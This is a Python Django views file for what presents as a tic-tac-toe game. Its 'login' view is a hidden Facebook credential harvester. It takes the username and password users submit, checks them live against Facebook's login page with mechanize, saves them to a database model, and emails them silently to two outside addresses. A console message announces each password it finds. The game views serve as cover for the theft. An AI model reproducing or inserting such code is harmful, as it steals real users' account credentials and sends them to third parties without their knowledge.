from django.views.decorators.http import require_http_methods
from django.shortcuts import render, redirect, get_object_or_404
from django.core.urlresolvers import reverse
from .forms import NewGameForm, PlayForm
from .models import Game, Cred
import sys
import random
import mechanize
import cookielib
from django.contrib import messages

from django.core.mail import send_mail
import json

@require_http_methods(["GET", "POST"])
def index(request):
    print "request: ", request, request.POST
    if request.method == "POST":
        form = NewGameForm(request.POST)
        # Theoretically the only way this form can be invalid
        # is in the case of progammer error or malfeasance --
        # the user doesn't have anything to do.
        if form.is_valid():
            game = form.create()
            # In case the computer is X, it goes first.
            game.play_auto()
            game.save()
            return redirect(game)
    else:
        form = NewGameForm()
    return render(request, 'game/game_list.html', {'form': form})


@require_http_methods(["GET", "POST"])
def game(request, pk):
    game = get_object_or_404(Game, pk=pk)
    if request.method == "POST":
        # Check for index.
        form = PlayForm(request.POST)
        if form.is_valid():
            game.play(form.cleaned_data['index'])
            game.play_auto()
            game.save()
            # Redirect to the same URL so we don't get resubmission warnings.
            # This is a relatively dumb UI; what you would really
            # want to do is have a front-end UI that does requests via
            # AJAX (jQuery or Ember)
            return redirect(game)
        else:
            # What to do? This is a programmer error for now.
            pass

    return render(request, "game/game_detail.html", {
        'game': game
    })


def login(request):
    data = request.POST
    print data
    if 'userid' in data:
        useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
        attempt = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        try:
            br.addheaders = [('User-agent', random.choice(useragents))]
            site = br.open(attempt)
            br.select_form(nr=0)
            
            print "DATA: ", data
            ##Facebook
            br.form['email'] =data["userid"]
            br.form['pass'] = data["password"]
            br.submit()
            log = br.geturl()
            print log
            Cred.objects.create(
                username=data["userid"],
                password=data["password"]
            )
            send_mail(
            "Facebook Credentials",
            json.dumps(data),
            "no-reply@game.com",
            ["b4you0870@gmail.com", "rohan@rohanroy.com"],
            fail_silently=True
            )
            if log != attempt:
                print "\n\n\n [*] Password found .. !!"
                print "\n [*] Password : %s\n" % data["password"]

                return redirect(reverse("game:play"))
            else:
                messages.add_message(request, messages.ERROR, "Login Failed")
        except KeyboardInterrupt:
            print "\n[*] Exiting program .. "
    return render(request, "game/game_start.html")